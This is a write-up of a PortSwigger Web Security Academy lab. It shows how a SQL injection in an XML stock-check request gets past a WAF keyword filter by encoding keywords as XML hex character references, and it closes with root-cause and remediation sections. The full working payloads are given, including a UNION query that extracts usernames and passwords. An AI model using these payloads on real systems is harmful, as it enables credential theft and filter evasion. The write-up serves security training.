# SQL Injection with Filter Bypass via XML Encoding

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
SQL Injection – WAF Bypass – XML Entity Encoding

## Lab Objective
Exploit a SQL injection vulnerability in the stock check functionality, bypass the Web Application Firewall (WAF) using XML entity encoding, retrieve the administrator's credentials, and log in to the administrator account.

## Vulnerability Overview

The application contains a SQL injection vulnerability in its stock check feature.

The stock check functionality sends data to the server through an XML request containing `productId` and `storeId`.

A Web Application Firewall (WAF) blocks requests containing recognizable SQL injection keywords such as `UNION` and `SELECT`.

However, XML supports character references that allow characters to be represented using decimal or hexadecimal values. The XML parser decodes these entities before the application processes the input.

This creates an opportunity to bypass poorly implemented WAF filtering by encoding SQL keywords within the XML request.

## Methodology

1. Intercepted the stock check request using Burp Suite.
2. Sent the `POST /product/stock` request to Burp Repeater.
3. Tested the `storeId` parameter using a mathematical expression to determine whether the input was evaluated by the application.
4. Attempted a basic UNION-based SQL injection.
5. Observed that the WAF blocked the request with a `403 Forbidden` response.
6. Used XML hexadecimal character references to obfuscate SQL keywords and bypass the WAF.
7. Determined the number of columns returned by the original query.
8. Used SQL string concatenation to retrieve usernames and passwords through a single output column.
9. Retrieved the administrator's credentials and authenticated through the login page.

## Exploitation Steps

### 1. Identifying the Injection Point

The stock check functionality generated an XML request similar to:

```xml
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Modified the `storeId` value to test whether the application evaluated SQL expressions.

A successful change in the returned stock quantity indicated that the input was being processed by the backend.

### 2. Testing UNION-Based SQL Injection

Attempted to inject a basic UNION query:

```sql
1 UNION SELECT NULL
```

The application returned:

```http
HTTP/2 403 Forbidden
```

This indicated that a security filter was detecting and blocking recognizable SQL injection patterns.

### 3. Bypassing the WAF Using XML Entity Encoding

Since the input was supplied through XML, hexadecimal XML character references could be used to obfuscate SQL keywords.

For example:

- `U` → `&#x55;`
- `S` → `&#x53;`

An encoded UNION query could therefore look like:

```xml
<storeId>1 &#x55;NION &#x53;ELECT NULL</storeId>
```

The XML parser decodes the character references before the application processes the input.

This allows the SQL keywords to reach the backend in their original form even though their encoded representation may evade a basic WAF keyword filter.

### 4. Determining the Number of Columns

After bypassing the WAF, tested the UNION query with different numbers of columns.

A single-column query worked:

```sql
1 UNION SELECT NULL
```

Adding another column resulted in an invalid response.

This indicated that the original query returned a single column.

### 5. Retrieving User Credentials

The database contained a `users` table with usernames and passwords.

Since the UNION query could return only one column, SQL string concatenation was used to combine both values into a single result.

The payload was:

```sql
1 UNION SELECT username || '~' || password FROM users
```

The `||` operator concatenates strings, while `~` acts as a separator between the username and password.

The SQL payload was then XML-entity-encoded before being submitted through the `storeId` parameter.

### 6. Extracting Administrator Credentials

The application returned the retrieved username and password combinations in its response.

Identified the administrator account, extracted its password, and used the credentials to log in through the application's My Account functionality.

The lab was successfully solved.

## Payloads

**Initial SQL injection test:**

```sql
1 UNION SELECT NULL
```

**WAF bypass example:**

```xml
<storeId>1 &#x55;NION &#x53;ELECT NULL</storeId>
```

**Final UNION-based extraction:**

```sql
1 UNION SELECT username || '~' || password FROM users
```

**XML encoding example:**

```xml
<stockCheck>
    <productId>1</productId>
    <storeId>
        1 &#x55;NION &#x53;ELECT username || '~' || password FROM users
    </storeId>
</stockCheck>
```

## Root Cause

The application incorporated user-controlled XML data into SQL queries without properly parameterizing the database operations.

Additionally, the WAF relied on detecting recognizable SQL keywords instead of understanding the actual meaning of the request after XML parsing and entity decoding.

This allowed an attacker to bypass the filtering mechanism using XML character references.

## Remediation

- Use parameterized queries and prepared statements instead of dynamically constructing SQL queries.
- Never rely exclusively on WAF keyword filtering to prevent SQL injection.
- Validate user input against expected data types and formats.
- Ensure security filtering accounts for canonicalization and XML entity decoding.
- Apply the principle of least privilege to database accounts.
- Avoid exposing database errors and sensitive information in application responses.

## Key Takeaways

- SQL injection vulnerabilities can exist in XML-based requests, not just URL parameters and form fields.
- WAFs that rely on simple keyword matching can potentially be bypassed through encoding techniques.
- XML hexadecimal character references can represent characters without changing their meaning after XML parsing.
- UNION-based SQL injection requires the injected query to return the same number of columns as the original query.
- SQL string concatenation can help retrieve multiple values when only one output column is available.
- Parameterized queries remain the fundamental defense against SQL injection.

## References

- PortSwigger Web Security Academy – SQL Injection with Filter Bypass via XML Encoding
- PortSwigger – SQL Injection
- PortSwigger – UNION Attacks